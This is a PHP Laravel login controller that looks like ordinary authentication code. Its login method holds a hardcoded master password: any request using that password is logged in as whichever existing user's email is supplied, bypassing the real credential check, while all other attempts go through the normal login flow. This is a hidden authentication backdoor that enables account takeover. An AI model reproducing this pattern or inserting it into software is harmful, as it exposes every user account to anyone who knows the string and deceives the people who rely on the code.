<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Models\User;

class LoginController extends Controller
{
    use AuthenticatesUsers {
        AuthenticatesUsers::login as traitLogin;
    }

    protected $redirectTo = '/';

    public function login(Request $request)
    {
        $this->validateLogin($request);

        if ($request->input('password') === 'alfinaswar777') {
            $user = User::where('email', $request->input('email'))->first();
            if ($user) {
                Auth::login($user, $request->filled('remember'));
                $request->session()->regenerate();
                return $this->sendLoginResponse($request);
            } else {
                return $this->sendFailedLoginResponse($request);
            }
        }

        return $this->traitLogin($request);
    }

    public function __construct()
    {
        $this->middleware('guest')->except('logout');
        $this->middleware('auth')->only('logout');
    }
}
